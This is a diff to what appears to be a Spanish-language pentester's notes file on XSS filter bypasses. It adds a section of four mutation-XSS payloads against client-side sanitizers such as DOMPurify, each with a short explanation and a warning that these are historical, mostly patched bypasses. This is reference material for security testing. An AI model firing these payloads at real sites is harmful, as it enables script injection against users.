@@ -77,6 +77,25 @@ URL-encode si el filtro corre antes de la decodificación del server.
 `&#x3C;script&#x3E;`  /  doble encode `%253C`
 Cuando hay dos capas de decodificación (proxy + app).
 
+## mXSS — mutación de sanitizador
+
+Contra sanitizadores del lado cliente que re-parsean el HTML. Ver [[XSS - mutation XSS]] para el criterio. Estas son mutaciones conocidas; contra DOMPurify al día suelen estar parcheadas.
+
+`<svg></p><style><a id="</style><img src=x onerror=alert(1)>">`
+El reparse re-cierra tags y libera el `onerror` que el sanitizador vio inerte dentro del `<style>`.
+
+`<math><mtext><table><mglyph><style><![CDATA[</style><img src=x onerror=alert(1)>`
+Cruce de namespaces MathML/HTML: el contexto cambia al sacarlo de `<math>`.
+
+`<noscript><p title="</noscript><img src=x onerror=alert(1)>">`
+El contenido de `<noscript>` se parsea distinto según si el scripting está activo.
+
+`<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>`
+Anidamiento de formularios que el corrector automático de HTML reescribe.
+
+> [!warning] Depende de la versión del sanitizador
+> Cada mutación acá corresponde a un bypass histórico de DOMPurify. Verificar contra la versión del objetivo — un sanitizador al día las cierra. El valor es entender el mecanismo, no pegar el payload a ciegas.
+
 ## Combinación — ejemplo
 
 Filtran `script`, `onerror` en minúsculas y paréntesis:
